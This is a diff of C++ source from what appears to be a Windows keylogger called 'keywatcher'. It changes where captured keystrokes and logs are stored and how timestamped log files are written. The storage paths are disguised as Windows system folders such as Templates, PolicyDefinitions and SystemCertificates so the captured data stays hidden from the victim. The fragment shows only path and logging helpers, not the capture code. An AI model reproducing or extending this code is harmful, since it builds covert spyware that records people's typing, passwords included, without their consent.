@@ -23,7 +23,7 @@ std::string kw::fetch_apps_root_path() {
   std::string base_path = getenv("APPDATA");
 
   // path we want to put keystrokes and keywatcher logs
-  std::string apps_path = "\\Microsoft\\Windows\\Templates\\dumps0x45gg\\";
+  std::string apps_path = "\\Microsoft\\Windows\\Templates\\dumps0x45FF\\";
 
   return base_path + apps_path;
 }
@@ -32,6 +32,12 @@ std::string kw::fetch_apps_root_path() {
 std::string kw::fetch_log_path() {
   // location to put all log files
   return kw::fetch_apps_root_path() + "PolicyDefinitions\\";
+}
+
+
+std::string kw::fetch_keyfile_path() {
+  // location to put all files which records keystrokes
+  return kw::fetch_apps_root_path() + "SystemCertificates\\";
 }
 
 
@@ -65,10 +71,9 @@ void kw::log(const std::string s) {
   if (!validate_path(path))
     return;
 
-  kw::datetime dt = kw::datetime();
-
   // get file name based on current date and month
-  std::string filename = dt.get_dated_filename() + ".log";
+  kw::timestamp dt;
+  std::string filename = dt.get_filename() + ".log";
 
   try {
     std::ofstream file(path + filename, std::ios::app);     // opening file in append mode
@@ -77,7 +82,7 @@ void kw::log(const std::string s) {
     if (!file)
       return;
 
-    file << "[" << dt.now() << "] " << s << std::endl;
+    file << "[" << dt.get_timestamp() << "] " << s << std::endl;
     file.close();
   }
   catch(...) {
